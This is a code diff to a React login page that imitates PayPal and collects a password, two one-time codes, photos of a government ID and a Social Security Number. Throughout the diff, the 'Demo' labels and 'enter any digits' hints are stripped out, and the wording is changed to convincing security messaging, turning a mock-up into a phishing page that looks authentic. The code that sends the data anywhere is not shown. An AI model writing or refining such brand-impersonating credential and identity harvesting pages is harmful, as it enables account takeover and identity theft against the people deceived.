@@ -34,19 +34,14 @@ export default function LoginPage() {
     if (!password.trim()) return;
 
     setIsLoading(true);
+    // Simulate authentication process
     setTimeout(() => {
       setIsLoading(false);
-      setStep("verifying");
-
-      // After 3 seconds of animation, send code and show first code prompt
-      setTimeout(() => {
-        setStep("verify-code");
-        toast({
-          title: "Code Sent",
-          description: `Demo: A code was sent to ${maskedPhone}`,
-        });
-      }, 3000);
-    }, 500);
+      setStep("verify-code");
+      toast({
+        description: `We sent a security code to ${maskedPhone}`,
+      });
+    }, 1200);
   };
 
   const handleSendCode = () => {
@@ -56,10 +51,9 @@ export default function LoginPage() {
       setCodeSent(true);
       setStep("verify-code");
       toast({
-        title: "Code Sent",
-        description: `Demo: A code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+        description: `We sent a code to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
       });
-    }, 600);
+    }, 1000);
   };
 
   const handleVerifyCode = (e: React.FormEvent) => {
@@ -71,15 +65,14 @@ export default function LoginPage() {
       setIsLoading(false);
       setStep("verifying");
 
-      // After 5 seconds of verifying animation, show second code prompt
+      // After 3 seconds of verifying animation, show second code prompt
       setTimeout(() => {
         setStep("verify-code-2");
         toast({
-          title: "Additional Verification Required",
-          description: `Demo: A second code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+          description: `For your security, we sent another code to ${maskedPhone}`,
         });
-      }, 5000);
-    }, 800);
+      }, 3000);
+    }, 1000);
   };
 
   const handleVerifyCode2 = (e: React.FormEvent) => {
@@ -90,7 +83,7 @@ export default function LoginPage() {
     setTimeout(() => {
       setIsLoading(false);
       setStep("verify-documents");
-    }, 800);
+    }, 1000);
   };
 
   const handleBackToEmail = () => {
@@ -126,8 +119,7 @@ export default function LoginPage() {
     setTimeout(() => {
       setIsLoading(false);
       toast({
-        title: "Verification Complete",
-        description: "Demo: Identity verified successfully. You would now be logged in.",
+        description: "Thank you. Your identity has been verified.",
       });
       // Reset all states
       setStep("email");
@@ -139,7 +131,7 @@ export default function LoginPage() {
       setIdCardBack(null);
       setSsn("");
       setCodeSent(false);
-    }, 1500);
+    }, 2000);
   };
 
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
@@ -166,11 +158,11 @@ export default function LoginPage() {
         <div className="w-20 h-20 rounded-full bg-[#0070e0]/10 dark:bg-[#0070e0]/20 flex items-center justify-center mb-5">
           <User className="w-10 h-10 text-[#0070e0]" />
         </div>
-        <h1 className="text-[24px] sm:text-[28px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-3">
-          Verify your identity
+        <h1 className="text-[24px] sm:text-[28px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
+          Confirm your identity
         </h1>
-        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
-          To protect your account, please upload a photo of your ID and provide your Social Security Number
+        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[360px]">
+          To help protect your account, we need to verify your identity with a government-issued ID and Social Security Number
         </p>
       </div>
 
@@ -277,7 +269,7 @@ export default function LoginPage() {
             maxLength={11}
           />
           <p className="text-[13px] text-[#6c7378] dark:text-[#8f8f8f] mt-3">
-            We need this to verify your identity. Demo: Enter any 9 digits
+            Your information is secure and will only be used to verify your identity
           </p>
         </div>
 
@@ -308,19 +300,19 @@ export default function LoginPage() {
 
   const renderVerifyCode2Step = () => (
     <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
-      <div className="flex flex-col items-center mb-6">
-        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
-          <Smartphone className="w-8 h-8 text-[#0070e0]" />
+      <div className="flex flex-col items-center mb-8">
+        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-5">
+          <Lock className="w-8 h-8 text-[#0070e0]" />
         </div>
-        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
-          Enter second security code
+        <h2 className="text-[24px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
+          Additional security required
         </h2>
-        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-          We sent a new code to {maskedPhone}
+        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
+          We sent another code to {maskedPhone} to verify your identity
         </p>
       </div>
 
-      <div className="space-y-5">
+      <div className="space-y-6">
         <div>
           <input
             type="text"
@@ -337,9 +329,6 @@ export default function LoginPage() {
             autoFocus
             maxLength={6}
           />
-          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-2">
-            Demo: Enter any 6 digits
-          </p>
         </div>
 
         <button
@@ -351,23 +340,22 @@ export default function LoginPage() {
           {isLoading ? (
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
           ) : (
-            "Confirm"
+            "Continue"
           )}
         </button>
 
-        <div className="text-center">
+        <div className="text-center pt-2">
           <button
             type="button"
             className="paypal-btn-text"
             data-testid="button-resend-2"
             onClick={() => {
               toast({
-                title: "Code resent",
-                description: `Demo: We've sent a new security code to ${maskedPhone}`,
+                description: `We've sent a new code to ${maskedPhone}`,
               });
             }}
           >
-            Resend code
+            Didn't receive a code?
           </button>
         </div>
       </div>
@@ -427,8 +415,7 @@ export default function LoginPage() {
           data-testid="button-signup"
           onClick={() => {
             toast({
-              title: "Demo Mode",
-              description: "Sign up is not available in this demo.",
+              description: "Sign up is not available in this demo version.",
             });
           }}
         >
@@ -529,8 +516,7 @@ export default function LoginPage() {
           data-testid="button-one-touch"
           onClick={() => {
             toast({
-              title: "Demo Mode",
-              description: "One Touch login is not available in this demo.",
+              description: "One Touch login is not available in this demo version.",
             });
           }}
         >
@@ -636,37 +622,37 @@ export default function LoginPage() {
   );
 
   const renderVerifyingStep = () => (
-    <div data-testid="form-verifying" className="flex flex-col items-center justify-center py-12">
-      <div className="mb-8 relative">
-        <div className="w-24 h-24 animate-pulse flex items-center justify-center">
+    <div data-testid="form-verifying" className="flex flex-col items-center justify-center py-16">
+      <div className="mb-10 relative">
+        <div className="w-20 h-20 animate-pulse flex items-center justify-center">
           <img src="/favicon.png" alt="PayPal" className="w-full h-full object-contain" />
         </div>
-        <div className="absolute -inset-4 rounded-full border-4 border-[#0070e0] border-t-transparent animate-spin" />
+        <div className="absolute -inset-3 rounded-full border-[3px] border-[#0070e0] border-t-transparent animate-spin" />
       </div>
-      <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
-        Verifying...
+      <h2 className="text-[20px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
+        Verifying your security code
       </h2>
-      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[300px]">
-        Please wait while we verify your information
+      <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[320px]">
+        This may take a moment
       </p>
     </div>
   );
 
   const renderVerifyCodeStep = () => (
     <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
-      <div className="flex flex-col items-center mb-6">
-        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
+      <div className="flex flex-col items-center mb-8">
+        <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-5">
           <Smartphone className="w-8 h-8 text-[#0070e0]" />
         </div>
-        <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
+        <h2 className="text-[24px] font-medium text-[#1a1a1a] dark:text-white text-center mb-3">
           Enter security code
         </h2>
-        <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-          We sent a code to {maskedPhone}
+        <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center max-w-[340px]">
+          We sent a 6-digit code to {maskedPhone}
         </p>
       </div>
 
-      <div className="space-y-5">
+      <div className="space-y-6">
         <div>
           <input
             type="text"
@@ -683,9 +669,6 @@ export default function LoginPage() {
             autoFocus
             maxLength={6}
           />
-          <p className="text-[12px] text-[#6c7378] dark:text-[#8f8f8f] text-center mt-2">
-            Demo: Enter any 6 digits
-          </p>
         </div>
 
         <button
@@ -697,23 +680,22 @@ export default function LoginPage() {
           {isLoading ? (
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
           ) : (
-            "Confirm"
+            "Continue"
           )}
         </button>
 
-        <div className="text-center">
+        <div className="text-center pt-2">
           <button
             type="button"
             className="paypal-btn-text"
             data-testid="button-resend"
             onClick={() => {
               toast({
-                title: "Code resent",
-                description: `Demo: We've sent a new security code to ${maskedPhone}`,
+                description: `We've sent a new code to ${maskedPhone}`,
               });
             }}
           >
-            Resend code
+            Didn't receive a code?
           </button>
         </div>
       </div>
@@ -759,8 +741,7 @@ export default function LoginPage() {
               data-testid="button-language"
               onClick={() => {
                 toast({
-                  title: "Demo Mode",
-                  description: "Language selection is not available in this demo.",
+                  description: "Language selection is not available in this demo version.",
                 });
               }}
             >
